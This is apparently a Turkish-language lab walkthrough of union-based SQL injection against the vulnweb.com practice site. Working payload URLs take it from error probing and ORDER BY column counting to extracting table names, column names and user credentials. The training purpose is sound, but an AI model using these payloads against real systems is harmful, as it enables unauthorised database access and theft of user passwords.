`http://testphp.vulnweb.com/listproducts.php?cat=1`

GET isteği ile birlikte cat değerini alarak kategorize etmektedir. 

`http://testphp.vulnweb.com/listproducts.php?cat=1'` url adresini bu şekilde düzenleyip gönderdiğimizde  aşağıda görüldüğü gibi SQL syntax hatası vermektedir. 

![[Pasted image 20241112230956.png]]


`http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%201=1` url adresini bu şekilde güncellediğimizde cat=1 değerine ait tüm veriler geldi.
![[Pasted image 20241112231326.png]]


Alternatif olarak eğer 

`http://testphp.vulnweb.com/listproducts.php?cat=1-` böyle bir istek gönderseydik yine syntax hatası alacaktık. Fakat `http://testphp.vulnweb.com/listproducts.php?cat=1--` gönderirsek '--' yorum satırı olarak algılanacağından yine aynı noktaya gelip kategori 1'e ulaşacağız. 


`ORDER BY ` komutu sqli için kritiktir. Order by komutu ile kolon miktarı tespit edilebilir . Unıon tabanlı SQLi için önemlidir çünkü unıon tabanlı sqli gerçekleşebilmesi için iki tablonun kolon sayısı miktarının eşit olması gerekir. 

Order by 1,2,3,4... gibi hata alınana kadar denenir. 

```
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 1--
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 2--
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 3--
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 4--
```


`http://testphp.vulnweb.com/listproducts.php?cat=1%20ORDER%20BY%20%2012%20--` 

Order by 12 de aşağıda ki hata alınmıştır. Böylelikle kolon sayısı 11 olarak tespit edilmiştir. 

```
Error: Unknown column '12' in 'order clause' Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
```

`testphp.vulnweb.com/listproducts.php?cat=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11--` şeklinde `UNION` operatörü ile SQLi payloadumuzu bu şekilde güncellediğimizde, aşağıdaki resimde gösterilen gibi bir çıktı almaktayız.

![[Pasted image 20241113000524.png]]

Buradan anlayacağımız 11,7,2 ve 9 kolonları aracılığıyla veri çıkartma işlemi yapabiliriz. 

`http://testphp.vulnweb.com/listproducts.php?cat=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,@@version--`

![[Pasted image 20241113001147.png]]

Bunun gibi kullanıalbilecek diğer komutlar 

- @@hostname
- @@log
- database()
- version()
- system_user()
- table_name()

`http://testphp.vulnweb.com/listproducts.php?cat=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,table_name%20from%20INFORMATION_SCHEMA.TABLES%20where%20table_schema=%27acuart%27--``


İsteğimizde bulunan sqli payladımızı bu şekilde güncelliyoruz ve veritabanında bulunan tablolarla alakalı bilgi ediniyoruz.


![[Pasted image 20241113002126.png]]

Kullanıcılar ile alakalı verilerin tutulduğu tablonun adını tespit etmiş olduk. Bu tablo adını kullanarak içeride bulunan kolon adlarını tespit etmek için aşağıda bulunan isteği gönderiyoruz. 

`http://testphp.vulnweb.com/listproducts.php?cat=-1%20UNION%20SELECT%201,column_name,3,4,5,6,7,8,9,10,11%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_schema=%27acuart%27%20and%20table_name=%27users%27--`![[Pasted image 20241113002336.png]]


Kolon adları, tablo adı ve database adı mevcut şimdi tüm kullanıcların kullanıcı adı ve parolalarını alacağız. 

`http://testphp.vulnweb.com/listproducts.php?cat=-1%20UNION%20SELECT%201,uname,3,4,5,6,7,8,pass,10,11%20from%20users--``
Klasik bir sql sorugusu ile tabloda bulunan kullanıcıyı aldık .

![[Pasted image 20241113002537.png]]
